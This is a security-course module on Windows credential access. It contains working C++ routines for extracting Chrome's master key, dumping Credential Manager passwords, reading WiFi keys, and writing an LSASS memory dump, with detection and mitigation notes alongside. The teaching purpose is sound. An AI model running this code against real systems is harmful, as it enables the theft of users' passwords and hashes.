# Module 11 — Credential Access

## 1. Why Credential Access?

After initial access, an attacker needs to move laterally. Credentials let them:
- Log into other machines on the network
- Access cloud services (AWS, Azure, Office 365)
- Elevate privileges
- Maintain persistence even after the implant is removed

As a blue team member you need to understand where credentials live so you can
protect them, detect access attempts, and simulate attacks for testing.

---

## 2. Credential Storage Locations on Windows

| Location | What it stores | Admin needed? |
|----------|----------------|---------------|
| LSASS process memory | Active session tokens, NTLM hashes, Kerberos tickets | Yes (for full dump) |
| SAM database | Local account NTLM password hashes | Yes + SYSTEM |
| Credential Manager (DPAPI) | Saved browser/app passwords, RDP creds | No (for current user) |
| Browser storage | Cookies, saved passwords (SQLite + DPAPI) | No (for current user) |
| LSA Secrets (registry) | Service account passwords, auto-logon | Yes |
| WiFi profiles | WPA2 passwords | No |
| .git config / .env files | API keys, DB passwords in dev repos | No |

---

## 3. Windows DPAPI — Data Protection API

DPAPI is Microsoft's built-in encryption system for applications to store
secrets. The key is derived from the user's password — only the current user
can decrypt their own data.

```cpp
#include <windows.h>
#include <wincrypt.h>

// Encrypt data (tied to current user)
std::vector<BYTE> DpapiEncrypt(const std::vector<BYTE>& plaintext) {
    DATA_BLOB in  = { (DWORD)plaintext.size(), (BYTE*)plaintext.data() };
    DATA_BLOB out = {};
    if (!CryptProtectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &out))
        return {};
    std::vector<BYTE> result(out.pbData, out.pbData + out.cbData);
    LocalFree(out.pbData);
    return result;
}

// Decrypt data (must be same user on same machine)
std::vector<BYTE> DpapiDecrypt(const std::vector<BYTE>& ciphertext) {
    DATA_BLOB in  = { (DWORD)ciphertext.size(), (BYTE*)ciphertext.data() };
    DATA_BLOB out = {};
    if (!CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &out))
        return {};
    std::vector<BYTE> result(out.pbData, out.pbData + out.cbData);
    LocalFree(out.pbData);
    return result;
}
```

**How browsers use DPAPI:**
Chrome, Edge, and Firefox store their master encryption key in a file, encrypted
with DPAPI. To steal browser passwords as the current user:
1. Read `%LOCALAPPDATA%\Google\Chrome\User Data\Local State` → JSON with `encrypted_key`
2. Base64-decode the key value
3. Strip the "DPAPI" prefix (first 5 bytes)
4. Call `CryptUnprotectData` on the remainder → raw AES-256 key
5. Open `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data` (SQLite)
6. For each row in `logins` table: AES-GCM decrypt `password_value` using the key

---

## 4. Chrome Password Extraction (Awareness Testing)

```cpp
// Simplified flow — for authorized awareness testing only

#include <windows.h>
#include <wincrypt.h>
#include <shlobj.h>
#include <fstream>
#include <iostream>

std::vector<BYTE> getChromeMasterKey() {
    char localApp[MAX_PATH];
    SHGetFolderPathA(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, localApp);
    std::string statePath = std::string(localApp) +
        "\\Google\\Chrome\\User Data\\Local State";

    // Read JSON file
    std::ifstream f(statePath);
    std::string json((std::istreambuf_iterator<char>(f)), {});

    // Extract "encrypted_key": "<base64>"  (simple string search)
    size_t keyPos = json.find("\"encrypted_key\":\"");
    if (keyPos == std::string::npos) return {};
    keyPos += 17;
    size_t endPos = json.find("\"", keyPos);
    std::string b64key = json.substr(keyPos, endPos - keyPos);

    // Base64 decode (Windows CryptStringToBinaryA)
    DWORD decodedLen = 0;
    CryptStringToBinaryA(b64key.c_str(), 0, CRYPT_STRING_BASE64, nullptr, &decodedLen, nullptr, nullptr);
    std::vector<BYTE> encrypted(decodedLen);
    CryptStringToBinaryA(b64key.c_str(), 0, CRYPT_STRING_BASE64, encrypted.data(), &decodedLen, nullptr, nullptr);

    // Remove DPAPI prefix (first 5 bytes: "DPAPI")
    std::vector<BYTE> dpapi(encrypted.begin() + 5, encrypted.end());

    // Decrypt with DPAPI
    return DpapiDecrypt(dpapi);
}
```

**Blue team note:** Chrome encrypts passwords in the SQLite database using
AES-256-GCM with a key that can ONLY be decrypted by the currently logged-in
user. An attacker with code execution as that user can always decrypt them.
The mitigation is not better encryption — it's preventing code execution in
the first place.

---

## 5. WiFi Password Extraction

Windows stores WiFi profiles as XML in `C:\ProgramData\Microsoft\Wlansvc\Profiles\`.
The key material is encrypted with DPAPI under SYSTEM account.

But there's an easier way — `netsh` gives it to you:

```cpp
// Get all WiFi passwords the current user has access to
std::string GetWifiPasswords() {
    // netsh wlan show profiles gives profile names
    // netsh wlan show profile name="<ssid>" key=clear gives the password
    return RunCommand("netsh wlan show profiles") +
           RunCommand("FOR /F \"tokens=2 delims=:\" %i IN "
                      "('netsh wlan show profiles ^| findstr :') "
                      "DO netsh wlan show profile name=%i key=clear");
}
```

For a C++ implementation without netsh: use `WlanOpenHandle`, `WlanEnumInterfaces`,
`WlanGetProfileList`, `WlanGetProfile` from `wlanapi.dll`.

---

## 6. Credential Manager (Windows Vault)

```cpp
#include <wincred.h>
#pragma comment(lib, "advapi32.lib")

void DumpCredentialManager() {
    CREDENTIALA** creds = nullptr;
    DWORD count = 0;

    CredEnumerateA(nullptr, 0, &count, &creds);
    for (DWORD i = 0; i < count; i++) {
        CREDENTIALA* c = creds[i];
        printf("Target:   %s\n", c->TargetName);
        printf("Username: %s\n", c->UserName ? c->UserName : "(none)");
        printf("Type:     %d\n", c->Type);
        if (c->CredentialBlobSize > 0) {
            // Password is in c->CredentialBlob — it's a wide string
            // (may be DPAPI-encrypted internally for some types)
            printf("Password: %.*s\n",
                   (int)(c->CredentialBlobSize / 2),
                   (wchar_t*)c->CredentialBlob);
        }
        printf("---\n");
    }
    CredFree(creds);
}
```

**Blue team note:** Credential Manager is frequently targeted. Any application
credential (RDP, mapped drive, Outlook) stored here is readable by any code
running as the user. Don't store critical credentials here on shared machines.

---

## 7. LSASS — The Crown Jewel (Admin Required)

LSASS (Local Security Authority Subsystem Service) holds:
- NTLM hashes of logged-in users
- Kerberos tickets (TGTs)
- Clear-text passwords (if WDigest is enabled)

Dumping LSASS requires `PROCESS_VM_READ` + `PROCESS_QUERY_INFORMATION` on the
LSASS process, which requires **admin/SYSTEM**.

```cpp
// Minimal MiniDump approach
HANDLE hLsass = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsassPid);
HANDLE hFile  = CreateFileA("lsass.dmp", GENERIC_WRITE, 0, nullptr,
                              CREATE_ALWAYS, 0, nullptr);
MiniDumpWriteDump(hLsass, lsassPid, hFile,
                  MiniDumpWithFullMemory, nullptr, nullptr, nullptr);
CloseHandle(hFile);
CloseHandle(hLsass);
// Then parse the dump with Mimikatz offline
```

**Detection:** Sysmon Event ID 10 (ProcessAccess) when anything opens LSASS
with `PROCESS_VM_READ`. Windows Defender ATP fires on this immediately.
Modern Windows has **Protected Process Light (PPL)** for LSASS — prevents
`OpenProcess` even as admin. Bypassing PPL requires a kernel driver.

---

## Exercises

- `ex01_dpapi.cpp` — encrypt/decrypt data with DPAPI
- `ex02_credential_manager.cpp` — enumerate Windows Vault entries
- `ex03_wifi_passwords.cpp` — read WiFi passwords using WlanAPI
- `ex04_chrome_passwords.cpp` — Chrome master key + DPAPI + SQLite (awareness test)
- `ex05_credential_scanner.cpp` — scan common credential files (.env, config.json, id_rsa)
